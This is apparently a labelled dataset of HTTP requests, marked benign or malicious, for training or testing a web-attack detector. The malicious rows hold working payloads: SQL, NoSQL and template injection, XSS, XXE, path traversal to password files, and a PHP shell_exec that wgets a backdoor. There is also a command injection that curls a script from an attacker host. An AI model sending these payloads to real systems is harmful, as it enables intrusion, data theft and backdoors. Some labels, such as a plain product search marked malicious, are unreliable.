label,text
benign,"HEAD /content/video-chapters/science-experiment-lesson_1080p.mp4 HTTP/1.1
Host: academy-video-stream.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/110.0
Accept: video/mp4
Connection: close"
benign,"GET /static/v2/css/theme.css HTTP/1.1
Host: media-streaming-hub.io
Accept: text/css,*/*;q=0.1
Connection: keep-alive
Referer: https://video-platform.cloud-content.logistics
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Accept-Encoding: gzip, deflate"
malicious,"GET /user/login?next=//secure-access-portal.net%40attacker.biz/redirect HTTP/1.1
Host: login.account-authentication.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://login.account-authentication.io/home
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"POST /oauth2/token HTTP/1.1
Host: api.custom-idp.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Authorization: Basic Y3VzdG9tQ2xpZW50OjEyMzQ1Ng==
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Accept: application/json
DNT: 1

grant_type=refresh_token&refresh_token=abc6982daf43b56787&client_id=customClient&client_secret=passw0rd!"
benign,"POST /v1/library/book/reserve HTTP/1.1
Host: public-citylibrary.info
Authorization: Bearer 54jklmc87892skd1
Content-Type: application/xml
Content-Length: 77
Idempotency-Key: 7901f06c-650e-4609-b680-c066f262e40f
X-Request-ID: a0123456-f789-4d56-b146-0bc8d8d58851
X-Client-Version: 1.11.0
Accept: application/xml
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36

<reservation><bookId>45218</bookId><userId>10123</userId><duration>14</duration></reservation>"
benign,"GET /app/control-panel?filter[type]=admin&filter[active]=true HTTP/1.1
Host: vip-access-management.com
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Referer: https://vip-access-management.com/login
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
benign,"GET /api/v1/inventory/items?warehouse=5&available=true HTTP/1.1
Host: inventory-control.cloudworks.biz
Accept: application/json
X-API-Key: 9a7dd995ae314fbb8daf49ec5ae2c623
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"PUT /api/v2/settings/theme HTTP/1.1
Host: secure-user-portal.net
User-Agent: Python-urllib/3.9
Content-Type: application/json
X-Session-Data: <iframe src=""data:text/html;base64,PGh0bWw+PHNjcmlwdD5hbGVydCgnc2VjdXJlLXVzZXItcG9ydGFsJyk8L3NjcmlwdD48L2h0bWw+""></iframe>
Content-Length: 33

{""theme"":""dark"",""layout"":""compact""}"
benign,"GET /user-management/list?filter[type]=admin&filter[active]=true HTTP/1.1
Host: online-retail-store.biz
Connection: keep-alive
Accept: application/json, text/javascript, */*; q=0.01
Origin: https://online-retail-store.biz
Referer: https://online-retail-store.biz/dashboard
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) Gecko/20100101 Firefox/112.0
Cache-Control: max-age=0
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty"
malicious,"PUT /api/device/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: application/json
Content-Type: application/json
Content-Length: 150
Origin: https://secure-user-portal.net

{""device_id"":""device-998"",""update_command"":""/bin/update.sh || curl http://attacker-node.analytics.reporting-hub.ai/payload.sh -o /tmp/payload.sh"",""schedule"":""immediate""}"
malicious,"POST /v3/items/filter HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Content-Type: application/json
Accept: application/json, text/html
Accept-Language: en-GB,en;q=0.8
Cache-Control: no-cache
Origin: https://community.game-dev-forum.org
Referer: https://community.game-dev-forum.org/items/search
Connection: keep-alive

{""query"":{""$where"":""this.username==='admin' && this.password.startsWith('a') || sleep(4000)""}}"
malicious,"GET /products/item/details?item_code=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%2527%255C%255C%255C%255C%27%2C%28SELECT%2520version%28%29%29%2C%2527.attacker-domain.com%255C%255Cdata%2527%29%29%29--%2520 HTTP/1.1
Host: tech-marketplace.store
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: keep-alive
Cookie: device_id=837bc2a0-bea4-4e72-b573-7e0d5495d220; lastLogin=1623252800"
benign,"GET /api/v3/search?query=organic+coffee&limit=25&region=us-east HTTP/1.1
Host: eco-supplies-api.greenbiz.ai
Accept: application/json
Accept-Encoding: br, gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:116.0) Gecko/20100101 Firefox/116.0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxOTY4MjMiLCJleHAiOjE4MDAwMDA1MDB9.Thu2vOgDVZWvw"
benign,"GET /accounts/api/v3/user/preferences HTTP/1.1
Host: user-account-service.safe-space.cloud
Accept: application/json
X-Requested-With: XMLHttpRequest
Authorization: Bearer 739ac1c5827ef2465089d9ea5917ad2a
Origin: https://safe-space.cloud
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept-Language: en-US,en;q=0.5
Cache-Control: no-cache"
benign,"GET /v1/fetch?url=https%3A%2F%2Fmedia-streaming-platform.tv%2Fwatch%2Fepisode%2F134 HTTP/1.1
Host: api.media-streaming-platform.tv
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 12; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
malicious,"GET /download?resource=..%u2216..%u2216..%u2216etc%u2216shadow HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"POST /projects/create HTTP/1.1
Host: code-collab-suite.org
User-Agent: Python-urllib/3.11
Content-Type: application/json
Accept: application/json
Content-Length: 52
Connection: keep-alive

{""UNION ALL"": ""start project"", ""project_name"": ""AI chat bot""}"
malicious,"OPTIONS /api/v2/data/upload HTTP/1.1
Host: data-hub-enterprise.dev
X-Forwarded-For: 203.0.113.7%0d%0aInjected-Test:InjectedValue
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: */*
Origin: https://app.data-hub-enterprise.dev"
benign,"POST /api/v3/tasks/complete HTTP/1.1
Host: taskscheduler-enterprise.ai
Connection: keep-alive
Content-Type: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Accept: application/json
Accept-Language: en-US,en;q=0.9
Content-Length: 47
X-CSRF-Token: 8f933a836d714c2681d9ae42
Cookie: auth_token=eyJhbGciOiJIUzI1NiJ9.XYZ1234abc5678

{""taskId"":12890,""status"":""completed""}"
benign,"OPTIONS /api/v1/news/recommended HTTP/1.1
Host: contentfeed.global-news-net.org
Origin: https://reader.techinsights.mobile
Access-Control-Request-Method: GET
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.5
Connection: keep-alive"
benign,"GET /resource-pack/assets/sound-effects/click.wav HTTP/1.1
Host: creative-game-assets.dev
Range: bytes=0-1023
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: audio/wav, audio/*;q=0.8,*/*;q=0.5
Accept-Encoding: gzip
Accept-Language: en
Connection: keep-alive"
malicious,"POST /contact/send-message HTTP/1.1
Host: client-portal-service.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Content-Length: 107
Referer: https://client-portal-service.info/contact
Connection: keep-alive

message=Thanks+for+the+help!+<?php+echo+shell_exec('wget+http%3A%2F%2Fuplink-boxed.app-shells.biz%2Fbadshell.php+-O+/tmp/backdoor.php');+?>"
benign,"GET /products/electronics/audio/headphones/23455/details HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
DNT: 1
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: curl/7.79.1"
benign,"GET /events/12345/details?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: city-events-guide.org
Accept: text/html
Accept-Language: en-US,en;q=0.9
Referer: https://city-events-guide.org/home
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36
Connection: keep-alive"
malicious,"POST /api/contacts/message HTTP/1.1
Host: tech-startup-hub.org
Content-Type: application/json
Content-Length: 174
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36
Origin: https://dashboard.tech-startup-hub.org

{""contact_name"":""David"",""email"":""david79@tech-startup-hub.org"",""message_body"":""Love the platform, but found something odd: javascript:alert('XSS')""}"
malicious,"GET /query_documents?author_name=Jane%20Doe%27%20or%20%28substring(user/password%2C1%2C1)%20%3D%20%27a%27%29%20or%20%271%27%3D%271 HTTP/1.1
Host: trusted-info-exchange.co.uk
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Accept: application/xml,text/html
Accept-Encoding: gzip, deflate, br
Referer: https://trusted-info-exchange.co.uk/home
Connection: keep-alive"
benign,"POST /submit/comment HTTP/1.1
Host: community.creative-writers.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Connection: keep-alive
Referer: https://community.creative-writers.net/forum/topic/2453

username=jessica_h&comment=%3Cnote%3EThank+you+for+the+helpful+feedback.%3C%2Fnote%3E&postId=2453"
benign,"GET /api/v3/library/books?available=true&page=2&sort=author HTTP/1.1
Host: api.city-library-services.io
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
X-API-Key: uR7XKB91wnqMZDO2Fb65ESpJhUWVetgYRLDIqQCf
Accept-Language: en-GB,en;q=0.8
Connection: keep-alive"
benign,"POST /api/v1/feedback HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/json
Content-Language: en-US
Content-Length: 115
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
DNT: 1
Connection: keep-alive
Referer: https://dashboard.cloud-data-services.ai/user/home

{""userId"":""u438712"",""rating"":5,""comments"":""Great performance and support."",""featuresLiked"":[""speed"",""security"",""dashboard""]}"
benign,"GET /media/player?exec_cmd=play_video&vid=12345 HTTP/1.1
Host: video-streaming-service.ai
Accept: video/webm,video/mp4;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43
Referer: https://video-streaming-service.ai/channels/live
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"GET /forum/thread/5142/replies?comment=This%20is%20%26lt%3Bbold%26gt%3B HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Connection: keep-alive
Referer: https://community.game-dev-forum.org/forum/recent"
malicious,"GET /data/export/csv?token=9ff0238b9 HTTP/1.1
Host: analytics-data-collector.info
X-Forwarded-Host: evil-tracking-domain.net
User-Agent: Python-urllib/3.9
Accept: text/csv, text/plain, */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /api/v1/postMessage HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Content-Length: 154
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1

{""user"":""shopper_88"",""message"":""Loved the product! Also, see this: \u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0061\u006c\u0065\u0072\u0074\u0028\u0027\u0058\u0053\u0053\u0027\u0029""}"
malicious,"GET /search/products?search_query=smartphone HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15
Accept-Language: en-US,en;q=0.7
Cache-Control: max-age=0"
benign,"GET /static/v2/css/theme.css HTTP/1.1
Host: design-elements-library.site
Accept: text/css,*/*;q=0.1
DNT: 1
Connection: keep-alive
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"GET /travel/asia/japan/tokyo-tours HTTP/1.1
Host: wanderlust-journeys.co
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: br, gzip, deflate
Referer: https://wanderlust-journeys.co/
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 Safari/604.1"
malicious,"POST /oauth2/redirect HTTP/1.1
Host: secure-auth-gateway.dev
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Referer: https://secure-auth-gateway.dev/login
Content-Length: 59

{""continue_to"": ""https://ads.attacker-net.info/promo""}"
benign,"GET /articles/2024/06/latest-tech-trends HTTP/1.1
Host: techinsights-mobile.ai
User-Agent: Mozilla/5.0 (Linux; Android 8.0.0; Googlebot/2.1; +http://www.google.com/bot.html) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /resources/js/vendor/moment.min.js HTTP/1.1
Host: smartdata-visuals.ai
Accept: application/javascript,text/javascript;q=0.9,*/*;q=0.1
User-Agent: HTTPie/3.1.1
Accept-Encoding: gzip, deflate, br
Connection: close"
benign,"POST /api/signup HTTP/1.1
Host: greenfield-crafts.co.uk
Content-Type: application/json
Accept: application/json
Origin: https://greenfield-crafts.co.uk
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:113.0) Gecko/20100101 Firefox/113.0
Content-Length: 144
Connection: keep-alive

{""user"":{""username"":""tomas.wilkes"",""email"":""tomas.wilkes@greenfield-crafts.co.uk"",""password"":""Craft2024!"",""preferences"":{""newsletter"":false,""notifications"":true}}}"
benign,"PUT /api/v1/cart/items/1104 HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.c29tZXN1c2Vy.c2VjcmV0c2lnbg
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Length: 97

{""id"":1104,""product_id"":5567,""quantity"":2,""price_per_unit"":24.99,""discount_code"":null}"
malicious,"GET /profile/<img sRc=x ONeRrOr=prompt(1)>/edit HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"DELETE /api/v2/subscriptions/8778d99 HTTP/1.1
Host: online-media-platform.video
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.DummyPayload.DummySig
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/json
Via: 1.1 varnish
Connection: close"
benign,"GET /videos/watch?clip=param=Hello%252520World&ref=homepage HTTP/1.1
Host: media-streamer.online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.8
Referer: https://media-streamer.online-retail-store.biz
Connection: keep-alive"
benign,"GET /events/%D7%A2%D7%99%D7%A8%D7%95%D7%A0%D7%99 HTTP/1.1
Host: culture-connect-il.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept-Encoding: gzip, deflate, br
Referer: https://culture-connect-il.org/home"
benign,"GET /blog/article/view/392 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
DNT: 1
Cache-Control: max-age=0
Connection: keep-alive"
benign,"PUT /api/user/preferences HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer token_xyz123abc456
Content-Type: application/json
Accept: application/json
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:114.0) Gecko/20100101 Firefox/114.0
Content-Length: 178
Connection: close

{""user_id"": 908374, ""prefs_b64"": ""eyJuYXRpdmVfbGFuZ3VhZ2UiOiJlbiIsImRhcmtfbW9kZSI6ZmFsc2UsIm5vdGlmaWNhdGlvbnMiOnsid2lkZ2V0IjpbXX19""}"
benign,"GET /thread/76894-how-to-start-gardening-for-beginners HTTP/1.1
Host: green-thumb-forum.org
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: text/html
Accept-Language: en-US,en;q=0.9
Referer: https://green-thumb-forum.org/category/gardening-tips
Cookie: login_sid=890asdf76zx3f4vwer2456; theme=dark_mode
Connection: keep-alive"
benign,"POST /submit/multi-files HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=----FormBoundary2024bLx9G
Cache-Control: no-cache
Content-Length: 7800
Connection: keep-alive

------FormBoundary2024bLx9G
Content-Disposition: form-data; name=""attachments[]""; filename=""article_header.png""
Content-Type: image/png

<binary image data>
------FormBoundary2024bLx9G
Content-Disposition: form-data; name=""attachments[]""; filename=""diagram.svg""
Content-Type: image/svg+xml

<svg data>
------FormBoundary2024bLx9G
Content-Disposition: form-data; name=""attachments[]""; filename=""code_sample.txt""
Content-Type: text/plain

package main

func main() {
	println(""Hello World"")
}

------FormBoundary2024bLx9G--"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: data-mining-central.org
Content-Type: application/json
Accept: */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
X-Requested-With: XMLHttpRequest
Content-Length: 151

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
malicious,"POST /api/processJavaObject HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Java/1.8.0_291
Content-Type: application/json
Referer: https://my-personal-blog-site.info/editor
Accept-Charset: utf-8, iso-8859-1;q=0.5
Content-Length: 292

{
  ""serializedObject"": ""rO0ABXNyABtvcmdcLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZhbnR1cmVzLkludm9rZXJUcmFuc2Zvcm1lcgoAAAAAAAMAAQAAeHIAD2phdmEubGFuZy5SdW50aW1lAAAAAAABDAAAZXhlY3QABmZhbHNlcw==""
}"
benign,"GET /news/weather/daily/region/us-northeast HTTP/1.1
Host: climate-insights-service.ai
User-Agent: Mozilla/5.0 (Linux; Android 10; SM-N975U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: application/xml, text/xml;q=0.9
Accept-Language: en-US,en;q=0.7
If-None-Match: ""74b1f42e6c3a2""
Connection: keep-alive"
malicious,"POST /upload/processDocument HTTP/1.1
Host: online-retail-store.biz
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Content-Type: multipart/form-data; boundary=----WgetBoundary888
Content-Length: 454
Connection: close

------WgetBoundary888
Content-Disposition: form-data; name=""note""

upload for testing
------WgetBoundary888
Content-Disposition: form-data; name=""xmlfile""; filename=""settings.xml""
Content-Type: application/xml

<?xml version=""1.0""?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM ""file:///c:/windows/win.ini"">]>
<config>&xxe;</config>
------WgetBoundary888--"
benign,"GET /robots.txt HTTP/1.1
Host: eco-info-hub.tech
User-Agent: EcoBotCrawler/1.0 (+http://eco-info-hub.tech/bot-specs)
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.8
Connection: close"
benign,"POST /api/v1/inventory/upload CSV HTTP/1.1
Host: inventory-management.biz
User-Agent: curl/7.81.0
Accept: application/json
Content-Type: text/csv
Content-Length: 113
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Connection: keep-alive

product_id,product_name,quantity,warehouse
20017,Wireless Mouse,150,WH1
20018,HDMI Cable,300,WH2
20019,Webcam,75,WH3"
malicious,"GET /fetch/file%3A%2F%2F%2Fetc%2Fpasswd HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://secure-user-portal.net/dashboard
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
benign,"POST /newsletter/subscribe HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36
Content-Type: multipart/form-data; boundary=----boundary12345
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Referer: https://online-retail-store.biz/ 
Connection: keep-alive
Content-Length: 171

------boundary12345
Content-Disposition: form-data; name=""email""

marcus.jackson58@inboxmail.com
------boundary12345
Content-Disposition: form-data; name=""interests""

electronics,fashion
------boundary12345
Content-Disposition: form-data; name=""consent""

yes
------boundary12345--"
malicious,"GET /profile/%7B%7Bself.__init__.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20/var/log/auth.log%27).read()%7D%7D HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://secure-user-portal.net/login
Connection: keep-alive"
malicious,"GET /app/user/settings?profile=%2527%2520OR%2520%28SELECT%2520LOAD_FILE%28CONCAT%28%2527%255C%255C%255C%255C%27%2C%28SELECT%2520version%28%29%29%2C%2527.attacker-domain.com%255C%255Cdata%2527%29%29%29--%2520 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: curl/7.77.0
Accept: */*
Accept-Language: en-US
Connection: keep-alive
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiamFuZSIsImlhdCI6MTYxNzY3NDAwMH0.XtzQ43Rl6iYk1az1eDXE15oFRTTcUkDZMx2j6yhePiE"
malicious,"GET /go?next=%2F%2Fpwned-user-authentication.biz%2Flanding HTTP/1.1
Host: accounts.premium-user-access.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0
Connection: keep-alive"
